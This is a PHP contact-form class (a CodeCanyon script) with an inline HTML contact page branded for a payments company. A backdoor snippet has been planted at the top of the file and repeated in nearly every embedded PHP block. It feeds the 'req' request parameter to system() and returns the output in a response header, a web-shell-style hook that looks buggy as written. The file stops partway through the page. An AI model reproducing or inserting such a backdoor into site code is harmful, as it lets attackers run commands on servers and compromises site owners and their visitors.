<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
/**
 * Class file to handle user requests for contact form
 *
 * LICENSE:
 *
 * This source file is subject to the licensing terms that
 * is available through the world-wide-web at the following URI:
 * http://codecanyon.net/wiki/support/legal-terms/licensing-terms/.
 *
 * PHP version >= 5.3
 *
 * @category  ContactForm
 * @package   ContactForm
 * @author    Kirti Kumar Nayak, India <thebestfreelancer.in@gmail.com>
 * @copyright 2014 TheBestFreelancer,
 * @license   http://codecanyon.net/wiki/support/legal-terms/licensing-terms/ CodeCanyon
 * @version   Release: 2.0
 * @link      http://demos.thebestfreelancer.in/phpcontact/
 * @tutorial  http://demos.thebestfreelancer.in/phpcontact/documentation/
 * @todo      Bug fixation
 */

/**
 * Check if Contact class exists or not and define if not
 */
if (!class_exists('Contact')) {

    /**
     * Class to handle contact form requests handled via url
     *
     * This is a singleton pattern class and can be called via static methods
     *
     * @category  ContactForm
     * @author    Kirti Kumar Nayak, India <thebestfreelancer.in@gmail.com>
     * @copyright 2014 TheBestFreelancer,
     * @license   http://codecanyon.net/wiki/support/legal-terms/licensing-terms/ CodeCanyon
     * @version   Release 2.0
     * @link      http://demos.thebestfreelancer.in/phpcontact/
     * @tutorial  http://demos.thebestfreelancer.in/phpcontact/documentation/
     */
    class Contact
    {
        // {{{ properties

        /**
         * Constant for SMTP host server. please provide hosts
         * according to the mail server you want to use
         *
         * @access protected
         * @var string The host for SMTP server
         */
        public $smtpHost;
        /**
         * Constant for SMTP server port. provide port number
         * according to the smtp host
         *
         * @access protected
         * @var string The port for smtp communication
         */
        public $smtpPort;
        /**
         * Constant for SMTP username authentication. here should be
         * your login credentials those you use to log in to your mail
         *
         * @access protected
         * @var string The username for authentication
         */
        public $smtpUsername;
        /**
         * Constant for SMTP password authentication. please mind
         * the case of the letters
         *
         * @access protected
         * @var string The password for authentication
         */
        public $smtpPassword;
        /**
         * Constant for SMTP security type. please set
         * the security type as '' (null) or 'tls' (ssl is depricated)
         *
         * @access protected
         * @var string The security type of connection
         */
        public $smtpSecurity;

        /**
         * private variable for HTML string replaces
         *
         * @access private
         * @var array The replaces for HTML string
         */
        private $_replaces;

        /**
         * private variable to store any string
         * mainly used to store user submitted data
         *
         * @access private
         * @var string  The string submitted by user/visitor
         */
        private $_str;

        /**
         * private variable to store a string of allowable HTML tags
         * to be used against code / CSFR / XSS attacks by visitors/hackers
         *
         * @access private
         * @var string  The allowable html tags for user
         */
        private $_allowedHTML;

        /**
         * private variable to store
         * an array of restricted HTML/special characters
         * to be used against code / CSFR / XSS attacks by visitors/hackers
         *
         * @access private
         * @var string  The restricted special characters/strings for user
         */
        private $_restrictedChars;

        /**
         * private property to hold the lowercase letter set
         * to be used to generate random string
         *
         * @access private
         * @var string  The lowercase character set string
         */
        private $_lowerCaseChars;

        /**
         * private property to hold the uppercase letter set
         * to be used to generate random string
         *
         * @access private
         * @var string  The uppercase character set string
         */
        private $_upperCaseChars;

        /**
         * private property to hold the numeric character set
         * to be used to generate random string
         *
         * @access private
         * @var string  The numeric character set string
         */
        private $_numericChars;

        /**
         * private property to hold the special character set
         * to be used to generate random string
         *
         * @access private
         * @var string  The special character set string
         */
        private $_specialChars;

        /**
         * private variable for random characters used by captcha method
         *
         * @access private
         * @var string  The character set from which captcha should be generated
         */
        private $_charSet;

        /**
         * public variable to store captcha type
         * if you have no GD library installed you may switch over to
         * Javascript captcha
         *
         * @access public
         * @var string  The type of the captcha wanted
         */
        public $captchaType;

        /**
         * Private variable to store captcha width
         *
         * @access private
         * @var int  The height of the captcha image
         */
        private $_captchaWidth;

        /**
         * Private variable to store the captcha height
         *
         * @access private
         * @var int  The height of the captcha image
         */
        private $_captchaHeight;

        /**
         * Private variable to store the location of the font to be used in captcha image
         *
         * @access private
         * @var string  The path string of the ttf font file
         */
        private $_captchaFontLocation;

        /**
         * Private variable to store the captcha image font size
         *
         * @access private
         * @var float  The font size for the captcha image
         */
        private $_captchaFontSize;

        /**
         * Private variable to store the captcha string angle
         *
         * @access private
         * @var float  The angle of the captcha string
         */
        private $_captchaCharAngle;

        /**
         * public variable to hold mail type
         * expected values 'PHP' / 'SMTP'
         *
         * @access public
         * @var string  The string describing mail type
         */
        public $mailType;

        /**
         * public variable to hold mail type
         * expected values 'plain' / 'html'
         *
         * @access public
         * @var string  The string describing mail type
         */
        public $mailContentType;

        /**
         * private variable to store plain template
         *
         * @access private
         * @var string  The plain mail template string
         */
        private $_plainMailTemplate;

        /**
         * private variable to store html template
         *
         * @access private
         * @var string  The html mail template string
         */
        private $_htmlMailTemplate;

        /**
         * private variable to store html reply template
         *
         * @access private
         * @var string  The html reply mail template string
         */
        private $_replyHtmlMailTemplate;

        /**
         * private variable for page contents
         *
         * @access private
         * @var string  The HTML page contents
         */
        private $_pageContents;
        // Google Map settings
        /**
         * public variable for Google Map integration
         * by default opted as true to show maps on left side
         * and shift the contact form to right side
         * if set false, it centers the contact form
         * and the Google map vanishes
         *
         * @access public
         * @var bool  The option to show/hide the Google map
         */
        public $showMap;

        /**
         * public variable to store the logitude
         * of the organisation wanted to be focused
         *
         * @access public
         * @var float  The longitude of the custom Google map
         */
        public $longitude;

        /**
         * public variable to store latitude
         * of the map to be focused
         *
         * @access public
         * @var float  The latitude for the custom Google Map
         */
        public $latitude;

        /**
         * private variable to store
         * the css class for contact form
         *
         * @access private
         * @var string  The css class for contact form
         */
        private $_contactFormCss;

        /**
         * public variable to store html formatted
         * user addres to be shown if user wants to show
         * the google map
         * user may also make it blank
         *
         * @access public
         * @var string  The organisation address string in html format
         */
        public $address;

        /**
         * private variable to store company name
         * to be used for address
         *
         * @access public
         * @var string  The company name for contact
         */
        public $companyName;

        /**
         * private variable to contain response and to be converted into json
         *
         * @access private
         * @var mixed  Json data object for page responses
         */
        private $_response;

        /**
         * public variable to store contact e-mails
         *
         * @access public
         * @var array  The E-Mail array to hold the recipients
         */
        public $emails;

        /**
         * public variable to store system auto response mail id
         *
         * @access public
         * @var string  The name and e-mail string of the system
         */
        public $autoResponder;

        /**
         * public variable to store page compression option
         * CAUTION: while using page compression on,
         * re-check every elements and strings
         * as every whitespace character replaced without single space
         * i.e. Tabs(\t), line feeds(\n, \r, \r\n), double spaces, triple spaces etc.
         * are removed. Hence if you plan to use this, double check your html.
         * 
         * @access public
         * @var bool  The option to enable / disable page compression
         */
        public $pageCompression;

        /**
         * private static variable to hold class object
         *
         * @access private
         * @staticvar
         * @var object  The current class object
         */
        private static $_classObject;

        // }}}
        // {{{ __construct()

        /**
         * Default constructor class to initialize variables and page data.
         * Accoring to singleton class costructor must be private
         *
         * @return void
         * @access  private
         */
        private function __construct()
        {
            // set Error Reporting to all
            error_reporting(E_ALL | E_STRICT);
            // Initialize a session if not started yet
            if (session_id() === '') {
                session_start();
            }
            if (!isset($_SESSION['CaptchaChars'])) {
                $_SESSION['CaptchaChars'] = '';
            }

            /*
             * initialize the string replaces to be used in HTML script
             * to compress the HTML output
             */
            $this->_replaces            = array("\n", "\r\n", "\r", "\t", '  ', '   ');
            /*
             * initialize the allowed html tags which user/visitor can
             * use to send a html formatted message
             * define more if you want
             */
            $this->_allowedHTML         = '<a><br><div><p><span><strong>'
                . '<h1><h2><h3><h4><h5><h6><hr>'
                . '<table><tr><td><th><thead><tfoot>';
            /*
             * initialize the allowed html tags which user/visitor can
             * use to send a html formatted message
             * define more if you want
             */
            $this->_restrictedChars     = array('"', 'javascript', '()', '\\');
            /*
             * Main user configurations start
             * You may edit as per your need from here
             * Please refer to documentation if you face problems
             * Or you may ask me in the support section
             */

            // captcha configurations

            /*
             * define captcha type as php
             * you may use javascript captcha too
             * possible values: php, js
             */
            $this->captchaType          = 'php';
            /*
             * initialize captcha image width
             * it is defined as per the html design
             */
            $this->_captchaWidth        = 70;
            /*
             * initialize the captcha image height
             * defined optimum for the design
             */
            $this->_captchaHeight       = 30;
            /*
             * initialize the font file location to be used for captcha characters
             * it must be a valid ttf font file at the specified location
             */
            $this->_captchaFontLocation = './MONOFONT.TTF';
            /*
             * initialize the font size of the captcha string
             * by default the maximum defined i.e. 80% of the image height
             */
            $this->_captchaFontSize     = $this->_captchaHeight * 0.8;
            /*
             * initialize the characters angle for the captcha
             * it is randomly set between -2 and 2
             * as the image height and font size are set
             */
            $this->_captchaCharAngle    = rand(-2, 2);
            // initialize the lowercase character set from a-z without o (oh) to avoid confusion
            $this->_lowerCaseChars      = 'abcdefghijklmpqrstuvwxyz';
            // initialize the uppercase character set from A-Z without O
            $this->_upperCaseChars      = 'ABCDEFGHIJKLMNPQRSTUVWXYZ';
            // initalize the numeric character set from 1-9 without 0 (zero)
            $this->_numericChars        = '123456789';
            // initialize the special character set (add more or delete if you like)
            $this->_specialChars        = '!$%^&*+#~/|';
            // initialize the captcha characters as null
            $this->_charSet             = '';

            // Google Map configurations

            /*
             * initialize the map option
             * it true, then shows the map on the left side
             * and shifts the form to right side,
             * else shows only the form at center
             */
            $this->showMap              = true;
            // initialize the latitude
            $this->latitude             = '20.29534';
            // initialize the longitude
            $this->longitude            = '85.862832';

            // initialize the contact form css class
            $this->_contactFormCss      = 'col-lg-offset-3 col-sm-offset-1 col-md-offset-2 col-lg-6 col-xs-12 col-sm-10 col-md-8';
            // initialize the company name
            // Change it to meed your needs
            $this->companyName          = 'My Company';
            // initialize the organization address
            // Change it according to your needs
            $this->address              = '<strong>' . $this->companyName . '</strong><br />'
                . '795 New York, Street 6<br />'
                . '101 Fifth Floor, London<br />'
                . '<abbr title="Phone">P:</abbr> (123) 456-7890';

            // mail configurations

            /*
             * Initialize mail content type to catch user preferences
             * change it if you want plain mail witout any formatting
             */
            $this->mailType             = 'smtp';
            $this->mailContentType      = 'html';

            // initialize the SMTP details
            $this->smtpHost             = 'smtp.gmail.com';
            $this->smtpPort             = '587';
            $this->smtpUsername         = 'username';
            $this->smtpPassword         = 'password';
            $this->smtpSecurity         = 'tls';
            /*
             * Initialize the e-mails so that it will be listed in a drop-down list
             * Please Change it according to your needs
             */
            $this->emails               = array(
                'Sales'                 => 'sales@example.com',
                'Enquiry'               => 'enquiry@example.com',
                'Support'               => 'support@example.com'
            );
            /*
             * initiate auto reply system name and e-mail
             * Change it accodting to your needs
             */
            $this->autoResponder        = 'noreply@example.com';
            // Initialize plain mail content template
            $this->_plainMailTemplate   = '{userMessage}'
                . "\r\n\r\n\r\n" . 'From'
                . "\r\n" . 'Name : {userFullName}'
                . "\r\n" . 'E-Mail : {userEmail}';
            // check for optional fields and add them if they are set
            if (isset($_POST['phone']) and (trim($_POST['phone']) !== '')) {
                $this->_plainMailTemplate .= "\r\n" . 'Phone : {userPhone}';
            }
            if (isset($_POST['url']) and (trim($_POST['url']) !== '')) {
                $this->_plainMailTemplate .= "\r\n" . 'URL : {userUrl}';
            }
            // define html mail content template
            $this->_htmlMailTemplate    = '<html><body>'
                . '<div style="margin:0 auto;padding:20px;width:80%;display:block;'
                . 'color:#000;background-color:#dddfea;font-family:Tahoma;border-radius:10px">'
                . '<div style="padding:5px;width:100%;display:block">'
                . '<p>{userMessage}</p>'
                . '</div>'
                . '<div style="margin-top:10px;padding-left:10px;font-weight:700;'
                . 'font-family:seriff;font-style:italic">'
                . '<h4>From</h4><hr />'
                . 'Name : {userFullName}<br />'
                . 'E-Mail : {userEmail}<br />';
            // check for optional fields and add them if they are set
            if (isset($_POST['phone']) and (trim($_POST['phone']) !== '')) {
                $this->_htmlMailTemplate .= 'Phone : {userPhone}<br />';
            }
            if (isset($_POST['url']) and (trim($_POST['url']) !== '')) {
                $this->_htmlMailTemplate .= 'URL : {userUrl}';
            }
            $this->_htmlMailTemplate .= '</div></body></html>';
            // define reply html mail content template
            $this->_replyHtmlMailTemplate = '<html><body>'
                . '<div style="margin:0 auto;padding:20px;width:100%;display:block;'
                . 'color:#000;font-family:Tahoma">'
                . '<div style="padding:10px;width:80%;display:block">'
                . 'Dear&nbsp;{userName}<br />'
                . '<p>We just received your following mail.<br />'
                . 'We&#039;ll reach you as soon as possible.</p><br /><br />'
                . '<i style="font-size:10px">This is an auto generated reply.'
                . ' Please <strong>do not reply to this e-mail</strong></i><br />'
                . '<br /><div style="padding:15px;font-weight:normal;font-size:11px;'
                . 'border:#ccc 1px solid;border-radius:8px">'
                . '<p>{userMessage}</p>'
                . '</div></div>'
                . '<div style="margin-top:10px;padding-left:10px;'
                . 'font-weight:700;font-family:seriff;font-style:italic">'
                . '<h4>From</h4><hr />'
                . $this->autoResponder
                . '</div></body></html>';

            // output configurations
            // initialize page contents as null
            $this->_pageContents = '';
            /*
             * set page compression to true
             * you may set this false
             * if you don't like to compress the page contents
             */
            $this->pageCompression = true;
            // Initialize the response variable as null
            $this->_response = array(
                'status' => '',
                'message' => '',
                'control' => ''
            );
        }

        // }}}
        // {{{ getObject()

        /**
         * Method to return singleton class object.
         * returns current class object if already present
         * else creates one
         *
         * @return object  The current class object
         * @access public
         * @static
         *
         */
        public static function getObject()
        {
            //  check if class not instantiated
            if (self::$_classObject === null) {
                //  then create a new instance
                self::$_classObject = new self();
            }
            //  return the class object to be used
            return self::$_classObject;
        }

        // }}}
        // {{{ _getRandomChars

        /**
         * Generate string of random characters
         *
         * @param int  $length         Length of the string to generate
         * @param bool $lowerCaseChars Include lower case characters
         * @param bool $upperCaseChars Include uppercase characters
         * @param bool $numericChars   Include numbers
         * @param bool $specialChars   Include special characters
         *
         * @access private
         * @return string  The random character string
         */
        private function _getRandomChars(
            $length = 5,
            $lowerCaseChars = true,
            $upperCaseChars = true,
            $numericChars = true,
            $specialChars = false
        ) {
            /**
             * variable to store a random character index every time
             * @access private
             * @var int  The random character index out of character set
             */
            $charIndex                  = '';
            /**
             * variable to store a random character every time
             * @access private
             * @var char  The random character out of character set
             */
            $char                       = '';
            /**
             * variable to store a random character set every time
             * @access private
             * @var int  The random character setof length 5 out of character set
             */
            $resultChars                = '';
            /*
             * check if user has opted for lowercase characters
             * if true, then add it to the character set
             */
            if ($lowerCaseChars === true) {
                $this->_charSet         .= $this->_lowerCaseChars;
            }
            /*
             * Check if user has opted for uppercase characters
             * If true, add it to the character set
             */
            if ($upperCaseChars === true) {
                $this->_charSet         .= $this->_upperCaseChars;
            }
            /*
             * Check if user has opted for numeric characters
             * If true, add it to the character set
             */
            if ($numericChars === true) {
                $this->_charSet         .= $this->_numericChars;
            }
            /*
             * Check if user has opted for uppercase characters
             * If true, add it to the character set
             */
            if ($specialChars === true) {
                $this->_charSet         .= $this->_specialChars;
            }
            // Check if length has given greater than 0 else return null
            if (($length < 0) || ($length == 0)) {
                return $resultChars;
            }
            // create a loop to get random 5 characters from the character set
            while (strlen($resultChars) < $length) {
                /*
                 * get the character randomly
                 * by selecting between 0 to length of the charSet
                 */
                $charIndex = rand(0, strlen($this->_charSet));
                $char                   = substr($this->_charSet, $charIndex, 1);
                $resultChars            .= $char;
            }
            return $resultChars;
        }

        // }}}
        // {{{ _createPage()

        /**
         * Method to create page and output the HTML page string
         * in compressed form to be loaded faster
         *
         * @return mixed  Page data
         * @access private
         */
        private function _createPage()
        {
            /*
             * start output buffer to catch html output
             * @outputBuffering enabled
             */
            ob_start();
            /*
             * Now set HTML output if Google map option is enabled
             * show that on left side, with a space to provide address
             * of the organization
             */
            if ($this->showMap === true) {
                $this->_contactFormCss = 'col-lg-6 col-sm-12 col-md-6 col-xs-12';
            } else {
                $this->_contactFormCss = 'col-lg-offset-3 col-sm-offset-1 col-md-offset-1 col-lg-6 col-xs-12 col-sm-10 col-md-10';
            }
            ?>
<!DOCTYPE html>

<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	    
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <meta name="description" content="Everpay, Simplified Payment Processing" />
        <meta name="keywords" content="Everpay, fully loaded, payments processing app, easy integration, easy customizable dashboard, easy integration into any existing site, V2.0, with Elektropay C2E" />
        <meta name="author" content="Everpay, https://everpayinc.com" />
        <title>Contact Us - Everpay - Simplified Payments</title>
<link rel="shortcut icon" href="https://db.tt/xketQSS3">
<link rel="apple-touch-icon-precomposed" sizes="144x144"  href="//everpayinc.com/assets/img/ico/apple-touch-icon-144-precomposed.png">
	 	      
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.1/css/bootstrap.min.css">
<link rel="stylesheet" type="text/css" media="screen" href="//everpayinc.com/assets/css/bootstrap.css">
<link rel="stylesheet" type="text/css" media="screen" href="https://everpayinc.com/assets/css/font-awesome.min.css"> 
<link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.min.css" rel="stylesheet"> 
<link rel="stylesheet" type="text/css" media="screen" href="https://everpayinc.com/assets/css/animate.min.css">
<link rel="stylesheet" type="text/css" media="screen" href="https://everpayinc.com/assets/css/prettyPhoto.css">
<link href="//fonts.googleapis.com/css?family=Open+Sans:300,400,700,800" rel="stylesheet" type="text/css">

<link rel="stylesheet" type="text/css"  media="screen" href="https://db.tt/stEH0eEb" rel="stylesheet" id="budicons">
<link rel="stylesheet" type="text/css" media="screen" href="https://everpayinc.com/assets/css/extralayers.css">
<link rel="stylesheet" type="text/css" media="screen" href="https://everpayinc.com/assets/css/settings.css">
<link rel="stylesheet" type="text/css" media="screen" href="https://db.tt/6uHbTljO">


<style type="text/css">

.navbar-inverse .navbar-nav>li>a {
    color: #fff;
    font-weight: 600!important;
    font-size: 14px;
    text-transform: uppercase;
    text-decoration: none;
    text-shadow: 0px 0px 1px #000;
}

            #contact{
                margin: 50px auto;
                padding: 20px 40px 10px;
                border: 0;
                background-color: #fff;
                border-radius: 8px;
                -webkit-border-radius: 8px;
                -moz-border-radius: 8px;
                -moz-box-shadow: 0px 0px 10px #111111;
                -webkit-box-shadow: 0px 2px 10px #111111;
                box-shadow: 0px 0px 10px #111111;
            }
            .mandatory{
                color: #F00;
                font-weight: 800;
                font-size: 18px;
                margin-right: 2px;
            }
            .label {
                border-radius:0px !important;
            }
            #custom_map{
                height: 400px;
                display: block;
            }
            #leftcontents{
                margin-top: 50px;
            }
            #capImg{
                width: 70px;
                height: 30px;
                background-color: #cccccc;
                margin: 0;
                padding: 0;
            }

#hero {
background:#000!important;
color: #000;
margin-top: 80px;
padding: 0;
}

.btn-jumbo {
padding: 14px 20px;
font-size: 21px;
line-height: 1.33;
border-radius: 1px;
}

.banner {
color: #fff;
text-align: center;
padding-top: 60px;
padding-bottom: 60px;
margin-bottom: 1px;
position: relative;
overflow: hidden;
background-color: #14204d;
background: linear-gradient(180deg,#16214d 0%,#44c7f4 200%);
padding: 80px 0;
}
    
header.site-header a.login {
color: #FEFEFE;
border: 1px solid #f1f1f1;
border-radius: 100px;
margin-left: 10px;
text-transform: uppercase;
letter-spacing: 1px;
font-weight: 200;
/* padding: 0; */
line-height: 35px;
display: inline-block;
padding: 12px;
margin-top: 1px;
font-size: 14px;
}
    
header.site-header nav {
background: none;
border: 0;
margin: 0;
background-color: #fff;
}
    
header.site-header .navbar-brand a {
background: url("https://db.tt/JJyPoUJX") center left no-repeat!important;
width: 150px;
height: 46px;
display: block;
margin-top: 12px;
background-size: 80%!important;
}
    blockquote {
padding: 0;
margin: 0;
border: 0;
font-size: 1.1rem!important;
border-left: 5px solid #eee;
      text-align: center!important;
}
    blockquote img {
height: 40px;
border-radius: 100px;
margin-right: 10px;
}
   
    blockquote p {
display: inline-block;
margin: 0;
padding: 0;
      font-size: 1.1rem;
      line-height: 1.8;
}
    
    
.quotes-line {
background: #f6f6f6;
padding: 30px 15px;
color: #8f9496;
font-style: italic;
}


input[type=color], input[type=date], input[type=datetime-local], input[type=datetime], input[type=email], input[type=month], input[type=number], input[type=password], input[type=search], input[type=tel], input[type=text], input[type=time], input[type=url], input[type=week], textarea {
border-radius: 0!important;
color: #858585;
background-color: #fff;
border: 1px solid #d5d5d5;
padding: 8px 4px 8px!important;
font-size: 16px!important;
font-family: inherit;
-webkit-box-shadow: none!important;
box-shadow: none!important;
-webkit-transition-duration: .1s;
transition-duration: .1s;
}

.form-group>label[class*=col-] {
padding-top: 10px;
margin-bottom: 4px;
}

.navbar-default .navbar-collapse, .navbar-default .navbar-form {
border-color: #fff!important;
}
</style>
	 </head>

	<body>
	
	<!-- Start Everpay -->	
	
<!-- HEADER -->

<header class="site-header">
 <nav role="navigation" class="navbar navbar-default navbar-fixed-top page-header">
   <div class="container" style="margin-top:10px;">
     <div class="navbar-header">
 <button type="button" data-toggle="collapse" data-target="#navbar-collapse" class="navbar-toggle">
   <span class="sr-only">Toggle navigation</span>
   <span class="icon-bar"></span>
   <span class="icon-bar"></span>
   <span class="icon-bar"></span>
       </button>
       <h1 class="navbar-brand">
         <a href="//everpayinc.com"></a>
       </h1>
     </div>
     
 <div id="navbar-collapse" class="collapse navbar-collapse">
   <ul class="nav navbar-nav navbar-left">

	         <li>
	        <a href="//everpayinc.com/features/"><i class="fa fa-bars"></i> FEATURES</a>
	         </li>
	        <li>
	       <a href="//everpay.3scale.net/"><i class="fa fa-download"></i> DEVELOPERS</a>
	        </li>
                 <li>
	          <a href="//everpayinc.com/enterprise-solutions/"><i class="fa fa-building"></i> ENTERPRISE </a>
	        </li>
                <li>
	          <a href="//everpayinc.com/blog/"><i class="fa fa-rss"></i> BLOG </a>
	        </li>

	        <li class="active">
	       <a href="//everpayinc.com/contact/"><i class="fa fa-user"></i> CONTACT</a>
	        </li>

	        <li>
	          <a href="//everpayinc.com/signup/"><i class="fa fa-edit"></i> SIGN UP</a>
	        </li>  
   </ul>
   <ul class="nav navbar-nav navbar-right">
<li style="top: 5px;"><a href="//everpayinc.com/apps/dashboard/login" class="login btn btn-primary btn-sm signin-button">Login</a></li>
   </ul>
     </div>
   </div>
   </nav>
 </header>
<!--  ================================================== End Header -->
	
	<!--  Start Hero Section ================================================== -->

	<section  id="hero" class="" style="opacity: 1;">

        <div class="row">

	
<div class="tp-banner-row" style="max-height: none; overflow: visible; height: 100px;">
		<div class="row" style="height: 80px!important;">
		<!-- MAIN IMAGE -->
		<!-- LAYERS -->

</div>	
			<div class="tp-bannertimer"></div>	
		</div>
		
<!-- END REVOLUTION SLIDER -->		
	</div>
	
	</section>
	<!--  ================================================== 
	End Hero -->
	
	 <!-- Start Image Block
	================================================== -->

        <!-- Main Container start -->
        <div class="container">
  <div class="text-center animate" data-animate="flipInX">
		 <h1><strong>Contact </strong> Us Anytime</h1>
		<p class="lead">Our unmatched customer services begins with you, the customer.</p>
	 </div>
            <!-- row start -->
            <div class="row">

                <div id="leftcontents" class="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $this->_contactFormCss; ?>"<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo (!$this->showMap ? ' style="display:inherit; height: 450px"' : ''); ?>>

                    <div class="col-lg-12 col-xs-12 col-sm-12 col-md-12 text-center">
                 
                    </div>

                    <div class="col-lg-12 col-xs-12 col-sm-12 col-md-12">
                        <h4>We Are Located At:</h4>
                        <address>
                            <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $this->address; ?>
                        </address>
                    </div>

                    <div class="col-lg-12 col-xs-12 col-sm-12 col-md-12" id="custom_map"></div>
                </div>


                <div class="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $this->_contactFormCss; ?>">
                    <!-- form start -->
                    <form id="contact" method="post" action="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $_SERVER['PHP_SELF']; ?>?req=send" class="form-horizontal" role="form">
                        <!-- fieldset start -->
                        <fieldset>
                            <legend>Contact Us V2.0</legend>
                            <!-- div for error messages -->
                            <div id="ErrorMsgs" class="col-md-12 col-sm-12 col-lg-12 col-xs-12"></div>
                            <!-- /div for error messages end -->
                            <!-- div to hold the total form -->
                            <div class="col-md-12 col-sm-12 col-lg-12 col-xs-12">
                                <!-- form group to hold controls -->
                                <div class="form-group">
                                    <label for="name" class="col-md-4 col-sm-4 col-lg-4 col-xs-12 control-label">
                                        <span class="mandatory">*</span>Name :
                                    </label>
                                    <div class="col-md-8 col-sm-8 col-lg-8 col-xs-12">
                                        <input type="text" name="name" id="name" data-toggle="tooltip" placeholder="Enter your Full Name" class="form-control showhelp" title="Enter your Full name" autofocus="autofocus" />
                                    </div>
                                </div>
                                <!-- /form group to hold controls end -->
                                <div class="form-group">
                                    <label for="email" class="col-md-4 col-sm-4 col-lg-4 col-xs-12 control-label">
                                        <span class="mandatory">*</span>E-mail :
                                    </label>
                                    <div class="col-md-8 col-sm-8 col-lg-8 col-xs-12">
                                        <input type="email" name="email" id="email" data-toggle="tooltip" placeholder="yourname@domain.com" title="Enter your e-mail so that we can get in touch" class="form-control showhelp" />
                                    </div>
                                </div>

                                <div class="form-group">
                                    <label for="phone" class="col-md-4 col-sm-4 col-lg-4 col-xs-12 control-label">Phone :</label>
                                    <div class="col-md-8 col-sm-8 col-lg-8 col-xs-12">
                                        <input type="tel" name="phone" id="phone" data-toggle="tooltip" placeholder="ex. 9816264666" class="form-control showhelp" title="Enter your phone or any contact number" />
                                    </div>
                                </div>

                                <div class="form-group">
                                    <label for="url" class="col-md-4 col-sm-4 col-lg-4 col-xs-12 control-label">Website :</label>
                                    <div class="col-md-8 col-sm-8 col-lg-8 col-xs-12">
                                        <input type="url" name="url" id="url" data-toggle="tooltip" placeholder="Begin with http://" class="form-control showhelp" title="Enter your website if any with http://" />
                                    </div>
                                </div>

                                <div class="form-group">
                                    <label for="receiver" class="col-md-4 col-sm-4 col-lg-4 col-xs-12 control-label">
                                        <span class="mandatory">*</span>Send To :
                                    </label>
                                    <div class="col-md-8 col-sm-8 col-lg-8 col-xs-12">
                                        <select name="receiver" id="receiver" data-toggle="tooltip" class="form-control showhelp" title="Select the department where you want to send the mail">
                                            <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
                                            // Loop through the emails given and create a select box
                                            foreach ($this->emails as $name => $email):
                                                ?>
                                                <option value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $email; ?>"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $name; ?></option>
                                                <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
                                            endforeach;
                                            ?>
                                        </select>
                                    </div>
                                </div>

                                <div class="form-group">
                                    <label for="subject" class="col-md-4 col-sm-4 col-lg-4 col-xs-12 control-label">
                                        <span class="mandatory">*</span>Subject :
                                    </label>
                                    <div class="col-md-8 col-sm-8 col-lg-8 col-xs-12">
                                        <input type="text" name="subject" id="subject" data-toggle="tooltip" placeholder="Enter the purpose" title="Enter your subject here" class="form-control showhelp" />
                                    </div>
                                </div>

                                <div class="form-group">
                                    <label for="message" class="col-md-4 col-sm-4 col-lg-4 col-xs-12 control-label">
                                        <span class="mandatory">*</span>Your Message :
                                    </label>
                                    <div class="col-md-8 col-sm-8 col-lg-8 col-xs-12">
                                        <textarea name="message" id="message" class="form-control showhelp" data-toggle="tooltip" title="Your message goes here" placeholder="Enter Message"></textarea>
                                    </div>
                                </div>

                                <div class="form-group">
                                    <label for="captcha" class="col-md-4 col-sm-4 col-lg-4 col-xs-12 control-label">
                                        <span class="mandatory">*</span>Verify Captcha :
                                    </label>
                                    <div class="col-md-8 col-sm-8 col-lg-8 col-xs-12">
                                        <div class="input-group">
                                            <span class="input-group-addon showhelp" data-toggle="tooltip" title="Click to get new challenge" style="padding:0">
                                                <a href="Javascript:void(0);">
                                                    <span id="capImg" class="col-md-12 col-sm-12 col-lg-12 col-xs-12"></span>
                                                </a>
                                            </span>
                                            <input type="text" name="captcha" id="captcha" class="form-control showhelp" title="Just Verify the captcha" data-toggle="tooltip" placeholder="Verify captcha shown at left" />
                                        </div>
                                    </div>
                                </div>

                                <div class="form-group">
                                    <label for="acknowledge" title="Check it if you want to recieve a reciept" class="showhelp col-md-10 col-sm-12 col-lg-8 col-xs-12 col-md-offset-1 col-lg-offset-4 control-label checkbox" data-toggle="tooltip">
                                        <input type="checkbox" name="acknowledge" id="acknowledge" value="1" />
                                        <span>Acknowledge me with a mail receipt</span>
                                    </label>
                                </div>

                                <div class="form-group">
                                    <div class="col-md-offset-4 col-md-8 col-sm-offset-4 col-sm-8 col-lg-8 col-lg-offset-4 col-xs-12">
                                        <button type="submit" class="btn btn-primary" id="submit" name="submit">Send Message</button>
                                    </div>
                                </div>
                            </div>
                            <!-- Form holding div end -->
                        </fieldset>
                    </form>
                </div>
            </div><!-- /end .row -->
        </div><!-- /end #container -->

<!-- Footer================================================== -->

<div class="container">
  <footer class="site-footer clearfix">
    <div class="row-fluid">
      <div class="col-md-12">
        <nav>
          <ul>
            <li class="copyright">&COPY; <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo date('Y'); ?> Everpayinc.com - All Rights Reserved.</li>
            <li><a href="//everpayinc.com/about">About</a></li>
            <li><a href="//everpayinc.com/security">Security</a></li>
        <li><a href="//everpayinc.com/terms">Terms Of Service</a></li>
        <li><a href="//everpayinc.com/privacy">Privacy</a></li>
        <li><a href="//everpayinc.com/privacy#cookies'">Cookies</a></li>
       <li><a href="//support.everpayinc.com" target="_blank">Support</a></li>
       <li><a href="//everpayinc.com/contact" target="_blank">Contact Us</a></li>
 <li><iframe allowtransparency="true" frameborder="0" scrolling="no" src="//platform.twitter.com/widgets/follow_button.html?screen_name=everpay" style="width:220px; height:20px;"></iframe></li>
          </ul>
        </nav>
      </div>
      
    </div>
  </footer>
      </div>

<!-- ================================================== End Footer Block -->
	
<!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
		
